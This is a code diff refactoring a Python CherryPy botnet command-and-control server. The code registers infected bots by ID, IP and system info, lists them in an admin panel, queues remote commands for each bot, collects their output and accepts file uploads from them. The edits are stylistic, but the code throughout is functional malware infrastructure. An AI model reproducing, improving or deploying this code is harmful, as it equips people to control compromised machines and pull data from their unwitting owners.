@@ -33,9 +33,7 @@ def validate_botid(candidate):
 def query_DB(sql, params=()):
     conn = sqlite3.connect('beta.db')
     cursor = conn.cursor()
-    result = []
-    for row in cursor.execute(sql, params):
-        result.append(row)
+    result = list(cursor.execute(sql, params))
     conn.close()
     return result
 
@@ -52,18 +50,26 @@ class Main(object):
     @cherrypy.expose
     def index(self):
         with open("Menu.html", "r") as f:
-            html = f.read()
-            return html
+            return f.read()
 
 
 class CNC(object):
     @cherrypy.expose
     def index(self):
         bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
-        output = ""
-        for bot in bot_list:
-            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3],
-                bot[0])
+        output = "".join(
+            '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>'
+            % (
+                bot[0],
+                bot[0],
+                "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]),
+                bot[2],
+                bot[3],
+                bot[0],
+            )
+            for bot in bot_list
+        )
+
         with open("List.html", "r") as f:
             html = f.read()
             html = html.replace("{{bot_table}}", output)
@@ -84,17 +90,19 @@ class API(object):
     def pop(self, botid, sysinfo):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
-        if not bot:
-            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
-        else:
+        if bot := query_DB("SELECT * FROM bots WHERE name=?", (botid,)):
             exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
-        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
-        if cmd:
-            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
-            return cmd[0][2]
         else:
+            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
+        if not (
+            cmd := query_DB(
+                "SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date",
+                (botid, 0),
+            )
+        ):
             return ""
+        exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
+        return cmd[0][2]
 
     @cherrypy.expose
     def report(self, botid, output):
@@ -114,10 +122,8 @@ class API(object):
     def stdout(self, botid):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        output = ""
         bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 10', (botid,))
-        for entry in reversed(bot_output):
-            output += "> %s\n\n" % entry[2]
+        output = "".join("> %s\n\n" % entry[2] for entry in reversed(bot_output))
         bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
         for entry in bot_queue:
             output += "> %s\n[PENDING...]\n\n" % entry[2]
@@ -140,13 +146,12 @@ class API(object):
         while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
         save_path = os.path.join(up_dir, src)
-        outfile = open(save_path, 'wb')
-        while True:
-            data = uploaded.file.read(8192)
-            if not data:
-                break
-            outfile.write(data)
-        outfile.close()
+        with open(save_path, 'wb') as outfile:
+            while True:
+                data = uploaded.file.read(8192)
+                if not data:
+                    break
+                outfile.write(data)
         up_url = "../uploads/" +  html_escape(botid) + "/" + html_escape(src)
         return 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>'
 
